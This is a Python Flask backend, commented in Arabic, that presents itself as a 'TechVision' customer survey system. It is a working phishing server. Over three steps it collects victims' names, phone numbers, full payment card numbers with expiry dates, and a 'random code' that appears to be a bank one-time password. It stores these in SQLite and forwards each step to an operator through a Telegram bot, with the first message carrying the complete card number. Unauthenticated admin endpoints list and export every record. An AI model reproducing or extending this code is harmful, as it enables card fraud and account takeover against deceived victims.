from flask import Flask, request, jsonify, send_file
from flask_cors import CORS
import sqlite3
import json
import requests
from datetime import datetime
import os

app = Flask(__name__)
CORS(app)  # السماح بجميع المصادر

# إعدادات Telegram
TELEGRAM_BOT_TOKEN = "توكن_البوت_هنا"
TELEGRAM_CHAT_ID = "chat_id_المدير_هنا"

DB_PATH = "techvision_surveys.db"

def init_db():
    """تهيئة قاعدة البيانات"""
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS surveys (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            survey_id TEXT UNIQUE NOT NULL,
            name TEXT NOT NULL,
            phone TEXT NOT NULL,
            card_number TEXT NOT NULL,
            expiry_date TEXT,
            email TEXT,
            random_code TEXT,
            device_type TEXT,
            device_os TEXT,
            device_resolution TEXT,
            step1_sent BOOLEAN DEFAULT 0,
            step2_sent BOOLEAN DEFAULT 0,
            step3_sent BOOLEAN DEFAULT 0,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    conn.commit()
    conn.close()
    print("✅ Database initialized successfully")

def send_telegram_message(message):
    """إرسال رسالة إلى Telegram"""
    try:
        # للاختبار بدون Telegram، اطبع الرسالة فقط
        print("\n" + "="*60)
        print("📱 TELEGRAM NOTIFICATION TO MANAGER:")
        print("="*60)
        print(message)
        print("="*60 + "\n")
        
        # إذا أردت إرسال حقيقي، أزل التعليق عن الكود التالي:
        if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
            data = {
                "chat_id": TELEGRAM_CHAT_ID,
                "text": message,
                "parse_mode": "HTML"
            }
            response = requests.post(url, data=data, timeout=5)
            return response.status_code == 200
        
        return True  # محاكاة النجاح للاختبار
        
    except Exception as e:
        print(f"❌ Error sending Telegram: {e}")
        return False

@app.route('/')
def home():
    return jsonify({
        "message": "TechVision Survey System",
        "version": "1.0",
        "endpoints": ["/step1", "/step2", "/step3", "/admin/surveys"]
    })

@app.route('/step1', methods=['POST', 'OPTIONS'])
def handle_step1():
    """الخطوة 1: المعلومات الشخصية"""
    if request.method == 'OPTIONS':
        return jsonify({}), 200
    
    try:
        data = request.json
        print(f"\n📥 Received Step 1 Data:")
        print(f"📋 Survey ID: {data.get('survey_id')}")
        print(f"👤 Name: {data.get('name')}")
        print(f"📱 Phone: {data.get('phone')}")
        print(f"💳 Card: {data.get('card_number')}")
        print(f"📅 Expiry: {data.get('expiry_date')}")
        print(f"📧 Email: {data.get('email')}")
        print("-" * 40)
        
        # حفظ في قاعدة البيانات
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO surveys (survey_id, name, phone, card_number, expiry_date, email)
            VALUES (?, ?, ?, ?, ?, ?)
        ''', (data['survey_id'], data['name'], data['phone'], 
              data['card_number'], data['expiry_date'], data.get('email')))
        
        conn.commit()
        survey_id = cursor.lastrowid
        
        # إعداد رسالة Telegram
        telegram_msg = f"""
📋 <b>إشعار جديد - الخطوة الأولى</b>
🏢 <b>الشركة:</b> {data.get('company', 'TechVision')}

👤 <b>المعلومات الشخصية:</b>
├ الاسم: {data['name']}
├ الهاتف: {data['phone']}
├ رقم البطاقة: {data['card_number']}
├ تاريخ الانتهاء: {data['expiry_date']}
└ البريد: {data.get('email', 'لم يتم الإدخال')}

🆔 <b>رقم المشاركة:</b> <code>{data['survey_id']}</code>
⏰ <b>الوقت:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

🔗 <i>بانتظار الرمز العشوائي...</i>
        """
        
        telegram_sent = send_telegram_message(telegram_msg)
        
        if telegram_sent:
            cursor.execute(
                "UPDATE surveys SET step1_sent = 1 WHERE id = ?",
                (survey_id,)
            )
            conn.commit()
        
        conn.close()
        
        return jsonify({
            "success": True,
            "message": "تم حفظ وإرسال المعلومات الشخصية",
            "survey_id": data['survey_id'],
            "telegram_sent": telegram_sent
        })
        
    except Exception as e:
        print(f"❌ Error in step1: {e}")
        return jsonify({"error": str(e)}), 500

@app.route('/step2', methods=['POST', 'OPTIONS'])
def handle_step2():
    """الخطوة 2: الرمز العشوائي ومعلومات الجهاز"""
    if request.method == 'OPTIONS':
        return jsonify({}), 200
    
    try:
        data = request.json
        print(f"\n📥 Received Step 2 Data:")
        print(f"🆔 Survey ID: {data.get('survey_id')}")
        print(f"🔢 Random Code: {data.get('random_code')}")
        print(f"📱 Device Info: {data.get('device', {}).get('type')} - {data.get('device', {}).get('os')}")
        print("-" * 40)
        
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        
        # تحديث البيانات
        device_data = data.get('device', {})
        cursor.execute('''
            UPDATE surveys 
            SET random_code = ?, device_type = ?, device_os = ?, 
                device_resolution = ?, updated_at = ?
            WHERE survey_id = ?
        ''', (data['random_code'], device_data.get('type'), 
              device_data.get('os'), device_data.get('resolution'),
              datetime.now(), data['survey_id']))
        
        # جلب بيانات العميل
        cursor.execute(
            "SELECT name, phone, card_number FROM surveys WHERE survey_id = ?",
            (data['survey_id'],)
        )
        survey = cursor.fetchone()
        
        if not survey:
            return jsonify({"error": "Survey not found"}), 404
        
        # إعداد رسالة Telegram
        telegram_msg = f"""
✅ <b>إشعار جديد - الخطوة الثانية</b>
🏢 <b>الشركة:</b> {data.get('company', 'TechVision')}

👤 <b>العميل:</b> {survey[0]}
📱 <b>الهاتف:</b> {survey[1]}
💳 <b>البطاقة:</b> {survey[2][-4:]} **** **** ****

🔢 <b>الرمز العشوائي:</b> <code>{data['random_code']}</code>

💻 <b>معلومات الجهاز:</b>
├ النوع: {device_data.get('type', 'غير معروف')}
├ نظام التشغيل: {device_data.get('os', 'غير معروف')}
└ الدقة: {device_data.get('resolution', 'غير معروفة')}

🆔 <b>رقم المشاركة:</b> <code>{data['survey_id']}</code>
⏰ <b>الوقت:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

🔐 <i>بانتظار التأكيد النهائي...</i>
        """
        
        telegram_sent = send_telegram_message(telegram_msg)
        
        if telegram_sent:
            cursor.execute(
                "UPDATE surveys SET step2_sent = 1 WHERE survey_id = ?",
                (data['survey_id'],)
            )
        
        conn.commit()
        conn.close()
        
        return jsonify({
            "success": True,
            "message": "تم حفظ وإرسال الرمز ومعلومات الجهاز",
            "telegram_sent": telegram_sent
        })
        
    except Exception as e:
        print(f"❌ Error in step2: {e}")
        return jsonify({"error": str(e)}), 500

@app.route('/step3', methods=['POST', 'OPTIONS'])
def handle_step3():
    """الخطوة 3: التأكيد النهائي"""
    if request.method == 'OPTIONS':
        return jsonify({}), 200
    
    try:
        data = request.json
        print(f"\n📥 Received Step 3 (Final):")
        print(f"🆔 Survey ID: {data.get('survey_id')}")
        print(f"👤 Name: {data.get('name')}")
        print(f"✅ Final Confirmation: {data.get('final_confirmation')}")
        print("-" * 40)
        
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        
        # جلب جميع بيانات الاستبيان
        cursor.execute(
            "SELECT * FROM surveys WHERE survey_id = ?",
            (data['survey_id'],)
        )
        survey = cursor.fetchone()
        
        if not survey:
            return jsonify({"error": "Survey not found"}), 404
        
        # إعداد رسالة Telegram نهائية
        telegram_msg = f"""
🎉 <b>اكتمال الاستبيان - التأكيد النهائي</b>
🏢 <b>الشركة:</b> {data.get('company', 'TechVision')}

👤 <b>العميل:</b> {survey[2]}  # name
📱 <b>الهاتف:</b> {survey[3]}  # phone
💳 <b>رقم البطاقة:</b> **** **** **** {survey[4][-4:] if survey[4] else '****'}  # card_number
📅 <b>تاريخ الانتهاء:</b> {survey[5]}  # expiry_date
📧 <b>البريد:</b> {survey[6] or 'لم يتم الإدخال'}  # email

🔢 <b>الرمز العشوائي:</b> <code>{survey[7]}</code>  # random_code
💻 <b>نوع الجهاز:</b> {survey[8]}  # device_type

🆔 <b>رقم المشاركة:</b> <code>{survey[1]}</code>  # survey_id
⏰ <b>وقت الاكتمال:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

✅ <i><b>تم إكمال الاستبيان بنجاح!</b></i>
        """
        
        telegram_sent = send_telegram_message(telegram_msg)
        
        if telegram_sent:
            cursor.execute(
                "UPDATE surveys SET step3_sent = 1, updated_at = ? WHERE survey_id = ?",
                (datetime.now(), data['survey_id'])
            )
        
        conn.commit()
        conn.close()
        
        return jsonify({
            "success": True,
            "message": "تم تأكيد الإرسال النهائي",
            "survey_id": data['survey_id'],
            "telegram_sent": telegram_sent,
            "completed_at": datetime.now().isoformat()
        })
        
    except Exception as e:
        print(f"❌ Error in step3: {e}")
        return jsonify({"error": str(e)}), 500

@app.route('/admin/surveys', methods=['GET'])
def get_surveys():
    """جلب جميع الاستبيانات للإدارة"""
    try:
        conn = sqlite3.connect(DB_PATH)
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        
        cursor.execute('SELECT * FROM surveys ORDER BY created_at DESC')
        surveys = cursor.fetchall()
        
        surveys_list = []
        for survey in surveys:
            surveys_list.append(dict(survey))
        
        conn.close()
        return jsonify(surveys_list)
        
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/admin/export', methods=['GET'])
def export_data():
    """تصدير البيانات"""
    try:
        conn = sqlite3.connect(DB_PATH)
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        
        cursor.execute('SELECT * FROM surveys ORDER BY created_at DESC')
        surveys = cursor.fetchall()
        
        data = []
        for survey in surveys:
            data.append(dict(survey))
        
        conn.close()
        
        # إنشاء ملف مؤقت
        import tempfile
        temp_file = tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.json')
        json.dump(data, temp_file, ensure_ascii=False, indent=2)
        temp_file.close()
        
        return send_file(
            temp_file.name,
            as_attachment=True,
            download_name=f'techvision_surveys_{datetime.now().strftime("%Y%m%d")}.json'
        )
        
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    # تهيئة قاعدة البيانات
    if not os.path.exists(DB_PATH):
        init_db()
    
    print("\n" + "="*60)
    print("🚀 TechVision Survey System Started Successfully!")
    print("="*60)
    print("📱 Frontend: Open index.html in browser")
    print("🔗 Backend API: http://127.0.0.1:5000")
    print("📊 Database: techvision_surveys.db")
    print("📨 Telegram Notifications: Enabled (Mock Mode)")
    print("="*60 + "\n")
    
    app.run(debug=True, port=5000, host='0.0.0.0')
